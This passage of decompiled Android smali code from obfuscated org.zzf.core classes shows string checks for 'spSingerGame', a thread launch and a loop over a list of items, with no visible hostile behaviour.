    iput-object v0, p0, Lorg/zzf/core/c/a;->l:Lorg/zzf/core/d/b;

    iget-object v0, p0, Lorg/zzf/core/c/a;->l:Lorg/zzf/core/d/b;

    if-eqz v0, :cond_0

    iget-object v0, p0, Lorg/zzf/core/c/a;->l:Lorg/zzf/core/d/b;

    invoke-virtual {v0}, Lorg/zzf/core/d/b;->a()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lorg/zzf/core/c/a;->d:Ljava/lang/String;

    iget-object v0, p0, Lorg/zzf/core/c/a;->d:Ljava/lang/String;

    if-eqz v0, :cond_0

    iget-object v0, p0, Lorg/zzf/core/c/a;->d:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    const-string v3, ""

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    iget-object v0, p0, Lorg/zzf/core/c/a;->d:Ljava/lang/String;

    const-string v3, "spSingerGame"

    invoke-virtual {v0, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lorg/zzf/core/c/a;->d:Ljava/lang/String;

    iput-object v0, p0, Lorg/zzf/core/c/a;->m:Ljava/lang/String;

    iget-object v0, p0, Lorg/zzf/core/c/a;->c:Landroid/content/Context;

    iget-object v3, p0, Lorg/zzf/core/c/a;->d:Ljava/lang/String;

    invoke-direct {p0, v0, v3}, Lorg/zzf/core/c/a;->a(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    add-int/lit8 v0, v1, 0x1

    move v1, v0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    :cond_1
    return-void
.end method

.method private c(Landroid/content/Context;Ljava/lang/String;)V
    .locals 2

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lorg/zzf/core/c/c;

    invoke-direct {v1, p0, p1, p2}, Lorg/zzf/core/c/c;-><init>(Lorg/zzf/core/c/a;Landroid/content/Context;Ljava/lang/String;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method


# virtual methods
.method public a(Ljava/util/List;)V
    .locals 4

    if-eqz p1, :cond_1

    invoke-interface {p1}, Ljava/util/List;->size()I

    move-result v0

    if-lez v0, :cond_1

    invoke-interface {p1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :goto_0
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lorg/zzf/core/d/f;

    const/4 v2, 0x2

    iget-object v3, p0, Lorg/zzf/core/c/a;->c:Landroid/content/Context;

    invoke-static {v2, v3}, Lorg/zzf/core/f/h;->a(ILandroid/content/Context;)Z

    move-result v2

    if-eqz v2, :cond_0

    invoke-direct {p0, v0}, Lorg/zzf/core/c/a;->a(Lorg/zzf/core/d/f;)V

    goto :goto_0

    :cond_0
    invoke-static {}, Lorg/zzf/core/b/i;->a()Lorg/zzf/core/b/i;

    move-result-object v0

    iget-object v1, p0, Lorg/zzf/core/c/a;->c:Landroid/content/Context;

    const/16 v2, 0x3ed

    invoke-virtual {v0, v1, v2}, Lorg/zzf/core/b/i;->e(Landroid/content/Context;I)V

    :cond_1
    return-void
.end method
